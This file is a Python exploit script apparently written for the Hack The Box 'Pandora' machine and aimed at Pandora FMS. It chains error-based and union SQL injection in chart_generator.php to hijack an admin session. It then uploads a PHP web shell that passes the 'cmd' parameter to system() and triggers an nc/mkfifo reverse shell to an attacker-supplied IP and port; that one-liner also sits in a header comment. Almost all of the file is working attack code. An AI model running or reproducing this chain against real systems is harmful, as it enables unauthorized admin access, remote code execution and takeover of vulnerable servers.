#!/usr/bin/python3

import argparse
import requests

# This script was created to automate getting a reverse shell in Pandora.htb machine via:
# + Bypass Authentication with a SQL Injection
# + Upload a php shell
# + Spawn a reverse shell
# Author: @nightwolfx2

# Help articles:
# + How to exploit error based SQL Injections -> https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
# + Reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f

# Usage:
# On a separated terminal, start a netcat listener, example:
# $nc -l -p 9999 -v
#
# Run the exploit as follows:
# └─$ python3 pandora.py -t 127.0.0.1 -p 9090 -a 10.10.14.2 -l 9999
# [+] Successfully bypassed admin restrictions
# [+] eaea.php shell has been uploaded successfully
#
# Enjoy the reverse shell :)

PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def count_session_ids(full_target):
    url = "http://%s/pandora_console/include/chart_generator.php?session_id='/**/AND/**/extractvalue(rand(),concat(0x3a,(SELECT/**/concat(0x3a,count(id_session),concat(0x3a),concat(0x3a))/**/FROM/**/pandora.tsessions_php/**/LIMIT/**/0,1)))%%23--" % full_target
    res = requests.get(url)
    output = str(res.text)
    count_pre = output.split('::',1)[1]
    count = count_pre.split('::',1)[0]
    return count

def session_ids(full_target, count):
    sessions = []
    for i in range (1,int(count)):
        url = "http://%s/pandora_console/include/chart_generator.php?session_id='/**/AND/**/extractvalue(rand(),concat(0x3a,(SELECT/**/concat(0x3a,id_session,concat(0x3a),concat(0x3a))/**/FROM/**/pandora.tsessions_php/**/LIMIT/**/%i,1)))%%23--" % (full_target,i)
        res = requests.get(url)
        output = str(res.text)
        session_id_pre = output.split('::',1)[1]
        session_id = session_id_pre.split('::',1)[0]
        res.close()
        url = "http://%s/pandora_console/include/chart_generator.php?session_id='/**/AND/**/extractvalue(rand(),concat(0x3a,(SELECT/**/concat(0x3a,IFNULL(convert(data,CHAR),0),0x3a,0x3a)/**/FROM/**/pandora.tsessions_php/**/LIMIT/**/%i,1)))%%23--" % (full_target,i)
        res = requests.get(url)
        output = str(res.text)
        data_pre = output.split('::',1)[1]
        data = data_pre.split('::',1)[0]
        res.close()
        if data != "0":
            sessions.append(session_id + ":" + data)
    return sessions

def get_admin_id(full_target):
    id=0
    url = "http://%s/pandora_console/include/chart_generator.php?session_id='/**/AND/**/extractvalue(rand(),concat(0x3a,(SELECT/**/concat(0x3a,tusuario_perfil.id_perfil,0x3a,0x3a)/**/FROM/**/pandora.tusuario_perfil/**/where/**/id_usuario='admin'/**/LIMIT/**/0,1)))%%23--" % full_target
    res = requests.get(url)
    output = str(res.text)
    id_pre = output.split('::',1)[1]
    id = id_pre.split('::',1)[0]
    return id

def bypass_admin(full_target, id, session):
    #http://127.0.0.1:9090/pandora_console/include/chart_generator.php?session_id=%27/**/union/**/SELECT/**/1,2,%27id_usuario|s:5:%22admin%22;%27/**/endof%23
    url = "http://%s/pandora_console/include/chart_generator.php?session_id=%%27/**/union/**/SELECT/**/1,2,%%27id_usuario|s:%s:%%22admin%%22;%%27/**/endof%%23" % (full_target, id)
    res = session.get(url)

    if "Pandora FMS Graph ( - )" in res.text:
        print("[+] Successfully bypassed admin restrictions")
    else:
        print("[-] Error, something failed...")
        exit(0)

def upload_shell(full_target, session, filename):
    url = "http://%s/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager" % full_target
    headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1:9090", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryV0mGYLO21FAMOzBA", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1:9090/pandora_console/index.php?sec=gextensions&sec2=godmode/setup/file_manager", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    data = "------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/x-php\r\n\r\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n</html>\n\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"umask\"\r\n\r\n\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"decompress_sent\"\r\n\r\n1\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"go\"\r\n\r\nGo\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"real_directory\"\r\n\r\n/var/www/pandora/pandora_console/images\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"directory\"\r\n\r\nimages\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"hash2\"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA\r\nContent-Disposition: form-data; name=\"upload_file_or_zip\"\r\n\r\n1\r\n------WebKitFormBoundaryV0mGYLO21FAMOzBA--\r\n" % filename
    res = session.post(url, headers=headers, data=data)
    if "Uploaded successfully" in res.text:
        print("[+] %s shell has been uploaded successfully" % filename)
    else:
        print("[-] Something failed when trying to upload the php shell")
        exit(0)

def rce(session, full_target, filename, attacker_ip, attacker_port):
    url = "http://%s/pandora_console/images/%s?cmd=rm+%%2Ftmp%%2Ff%%3Bmkfifo+%%2Ftmp%%2Ff%%3Bcat+%%2Ftmp%%2Ff%%7C%%2Fbin%%2Fsh+-i+2%%3E%%261%%7Cnc+%s+%s+%%3E%%2Ftmp%%2Ff" % (full_target, filename, attacker_ip, attacker_port)
    res = session.get(url)

def main():
        print("--Start--")

if __name__ == '__main__':
    session = requests.session()
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='host/ip to target, required=True')
    parser.add_argument('-p','--port', help='target port, required=True')
    parser.add_argument('-a','--attacker', help='attacker ip, required=True')
    parser.add_argument('-l','--listen', help='attacker listening port, required=True')
    args = parser.parse_args()
    full_target = args.target+":"+args.port
    attacker_ip = args.attacker
    attacker_port = args.listen
    # Examples of how to gather data from DB using Error based SQL injection, not really used in the exploitation...
    #count=count_session_ids(full_target)
    #sessions=session_ids(full_target, count)
    #for i in sessions:
    #    print(i)
    id=get_admin_id(full_target)
    if int(id) != 0:
        bypass_admin(full_target, id, session)
        filename="eaea.php"
        upload_shell(full_target, session, filename)
        rce(session, full_target, filename, attacker_ip, attacker_port)
